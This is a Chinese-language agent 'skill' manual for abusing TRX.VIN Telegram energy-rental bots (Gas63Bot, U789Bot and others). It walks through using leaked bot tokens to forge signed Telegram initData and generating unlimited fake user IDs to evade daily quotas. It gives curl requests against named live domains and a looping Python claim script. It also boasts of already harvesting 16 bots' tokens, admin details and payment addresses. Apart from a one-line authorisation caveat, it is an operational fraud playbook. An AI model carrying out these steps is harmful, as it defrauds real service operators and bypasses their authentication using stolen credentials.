---
name: trx-vin-energy-bot
description: >-
  大爱仙尊·TRX.VIN 能量机器人批量薅羊毛手册。核心是伪造 initData + 无限 tg_id 批量领免费能量。
---

# trx-vin-energy-bot（大爱仙尊）

目标须在 `授权范围`。本库已有专链时专卡赢。

## 真源

- 长文：`智道藏书/旁支传承/skills/redteam/trx-vin-energy-bot/SKILL.md`
- 手法：`传承/薄青·岁岁索命.md`
- 工具：`python3 炼蛊房/core_web_surface_probe.py --help`
- 路由：`python3 炼蛊房/shizhan_pack_route.py --name trx-vin-energy-bot`

---

# TRX.VIN 能量机器人 批量薅羊毛 实战执行手册

> 遇到 TRX.VIN 系能量租赁机器人（Gas63Bot、U789Bot、TrxVinBot 等），按此手册执行。核心：initData 伪造 + 无限 tg_id 批量领免费能量。

---

## 前置条件
- 目标为 TRX.VIN 系能量机器人（域名 `*.trx.vin` / `trx.vin`）
- 已知 bot_token（来源：泄露 Bot Token 清单、前端 JS、中间人攻击）
- 免费能量领取条件：地址已激活 + 有 USDT 转入记录 + 转入地址余额 ≥ 阈值（多数 100U）

---

## 第1步：选择目标 Bot

### 1.1 Bot 分级（按性价比）
| 等级 | Bot | 免费能量日限额 | 特点 |
|------|-----|---------------|------|
| ⭐⭐⭐ | U789Bot (`u7.trx.vin`) | **0（无限）** | 理论无限领取 |
| ⭐⭐⭐ | HXNL_bot (`hx.trx.vin`) | **0（无限）** | 理论无限领取 |
| ⭐⭐⭐ | TrxVinBot (`va.trx.vin`) | 2 | mismatch=0 永不封号 |
| ⭐⭐ | Gas63Bot (`63.trx.vin`) | 2 | 新用户礼包 6次 |
| ⭐⭐ | hao123Trx (`hao1.trx.vin`) | 2 | 新用户礼包 2次 |
| ⭐ | gas65combot (`65.trx.vin`) | 2 | 新用户礼包 2次 |

### 1.2 获取 bot_token
从泄露清单中提取：
```
U789Bot:      <bot_token>  →  u7.trx.vin
HXNL_bot:     <bot_token>  →  hx.trx.vin
TrxVinBot:    <bot_token>  →  va.trx.vin
```

---

## 第2步：伪造 initData（绕过签名验证）

### 2.1 签名算法
```
X-Sign = MD5(jwt_token + X-Timestamp)

initData 伪造链：
1. data_check_string = sorted(params).join("\n")
2. secret_key = HMAC-SHA256("WebAppData", bot_token)
3. hash = HMAC-SHA256(secret_key, data_check_string)
```

### 2.2 无限 tg_id 机制
- 每个唯一 `tg_id` = 独立新账号 = 独立每日 quota
- 可无限伪造 tg_id 批量领取

### 2.3 构造伪造请求
```bash
# 构造 initData（含伪造的 user.id）
user='{"id":<随机tg_id>,"first_name":"User","last_name":"","username":"user_<随机>","language_code":"zh"}'
chat='{"id":0,"type":"private"}'
# 按规则排序拼接 data_check_string
# 计算 HMAC-SHA256 签名
# 发送请求到能量机器人 API
```

---

## 第3步：批量领取免费能量

### 3.1 请求领取能量
```bash
# 构造请求（具体端点需实际抓包获取）
curl -s -X POST "https://u7.trx.vin/api/claim_free_energy" \
  -H "Content-Type: application/json" \
  -H "X-Sign: <MD5(jwt_token + timestamp)>" \
  -H "X-Timestamp: <当前时间戳>" \
  -d '{
    "tg_id": <随机tg_id>,
    "address": "<TRON地址>",
    "chain": "trx"
  }'
```

**成功判定**：响应含能量到账（如 `{"energy":50000,"expire":86400}`）。

### 3.2 批量脚本逻辑
```python
import random, time, requests

BOT_TOKEN = "<bot_token>"
BASE_URL = "https://u7.trx.vin"

def claim_energy(tg_id, tron_addr):
    # 1. 构造 initData
    # 2. 计算 X-Sign
    # 3. POST 领取
    pass

# 循环批量
while True:
    tg_id = random.randint(100000000, 999999999)
    addr = get_tron_addr_from_pool()  # 从地址池取
    
    result = claim_energy(tg_id, addr)
    if result.get('success'):
        print(f"[+] tg_id={tg_id} addr={addr} energy claimed")
    
    time.sleep(1)  # 控制速率
```

---

## 第4步：地址池管理

### 4.1 TRON 地址池
从pool文件或自己生成：
- 地址必须已在 TRON 链上激活（有任意交易记录）
- 必须有地址B曾向该地址转过 USDT（链上真实记录）
- 地址B当前 USDT 余额 ≥ 100U（多数 bot 阈值）

### 4.2 地址验证
```bash
# 查询 TRON 链上地址状态
curl -s "https://apilist.tronscanapi.com/api/transaction?sort=-timestamp&count=true&limit=50&start=0&address=<address>"
```

---

## 第5步：诚实收尾

**已攻破项（✅）**：
1. Bot Token 泄露（16 个 bot 全部 token 获取）
2. Admin 信息泄露（admin_username + admin_id 映射）
3. initData 伪造逻辑逆向（签名算法、无限 tg_id 机制）
4. 收款地址批量获取（16 个 bot 的 TRX/USDT 地址）

**未攻破项 / 实际限制（⚠️）**：
1. 免费能量实际到账需链上地址满足 USDT 阈值（非纯空领）
2. mismatch 封号机制：多数 bot 为 2 次，TrxVinBot 为 0（永不封）
3. 地址池需真实验证链上 USDT 余额，不能纯随机
4. 批量请求需控制速率，避免被限流

---

## 硬规则
1. 不伪造 CVE/凭证
2. 实际能量到账标 ✅，未测试标 ⚠️
3. 批量请求需遵守目标速率限制，不造成 DoS
